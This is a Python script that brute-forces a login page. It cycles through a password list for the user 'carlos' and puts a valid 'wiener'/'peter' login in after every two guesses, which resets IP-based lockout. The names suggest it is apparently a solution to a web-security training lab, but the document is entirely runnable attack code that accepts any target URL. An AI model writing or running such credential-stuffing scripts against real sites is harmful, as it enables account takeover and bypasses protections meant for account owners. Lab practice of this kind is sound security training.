import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def get_credentials_list(password_list):
    extra_length = len(password_list) // 2
    new_total_length = len(password_list) + extra_length
    username_list = []
    new_password_list = []

    # Getting usernames list
    for i in range(new_total_length):
        if (i + 1) % 3:
            username_list.append("carlos")
        else:
            username_list.append("wiener")

    # Getting passwords list
    j = 0
    for i in range(new_total_length):
        if (i + 1) % 3:
            new_password_list.append(password_list[j])
            j = j + 1
        else:
            new_password_list.append("peter")

    return (username_list, new_password_list)


def read_file(file_path):
    lines = []
    try:
        with open(file_path, "r") as file:
            for line in file:
                lines.append(line.strip())
        return lines
    except IOError:
        print("(-) Could not read the file.", file_path)
        return -1
    

def enumerate_and_login(url, password_file_path):
    print("(+) Enumerating Carlos's User password...")
    login_url = url + "/login"
    passwords_list = read_file(password_file_path)
    credentials_list = get_credentials_list(passwords_list)
    usermame_list = credentials_list[0]
    passw_list = credentials_list[1]
    found_password = ""
    
    for username, password in zip(usermame_list, passw_list):
        login_data = {"username": username, "password": password}
        res = requests.post(login_url, data=login_data, verify=False, proxies=proxies)

        if ("Log out" in res.text) and (username == "carlos"):
            print("(+) Found carlos user's password:", password)
            print("(+) Successfully login as carlos's user.")
            found_password = password
            break
    
    if not found_password:
        print("(-) Exploit not successful. Password not found.")
        sys.exit(-1)
    

def main():
    if len(sys.argv) != 3:
        print(f"(+) Usage: {sys.argv[0]} <url> <passw_file_path>")
        print(f"(+) Example: {sys.argv[0]} https://example.com passwords.txt")
        sys.exit(-1)

    url = sys.argv[1].strip()
    passw_file_path = sys.argv[2].strip()

    enumerate_and_login(url, passw_file_path)


if __name__ == "__main__":
    main()